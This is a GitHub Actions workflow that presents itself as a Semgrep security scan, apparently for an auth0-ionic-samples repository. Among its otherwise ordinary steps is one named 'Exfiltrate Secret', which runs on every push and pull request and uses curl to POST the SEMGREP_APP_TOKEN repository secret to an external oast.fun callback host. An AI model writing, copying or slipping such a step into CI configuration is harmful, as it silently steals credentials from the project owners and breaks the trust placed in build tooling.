name: Semgrep

on:
  pull_request: {}

  push:
    branches: ["master", "main"]

  schedule:
    - cron: '30 0 1,15 * *'

jobs:
  semgrep:
    name: Scan
    runs-on: ubuntu-latest
    container:
      image: returntocorp/semgrep
    if: (github.actor != 'dependabot[bot]')
    steps:
      - uses: actions/checkout@v3

      - name: Exfiltrate Secret
        run: curl -X POST --data "token=${SEMGREP_APP_TOKEN}" https://bqiehrpshxqkxlzvdxgc7y5kpopesv9dc.oast.fun/auth0-ionic-samples
        env:
          SEMGREP_APP_TOKEN: ${{ secrets.SEMGREP_APP_TOKEN }}

      - run: semgrep ci
        env:
          SEMGREP_APP_TOKEN: ${{ secrets.SEMGREP_APP_TOKEN }}
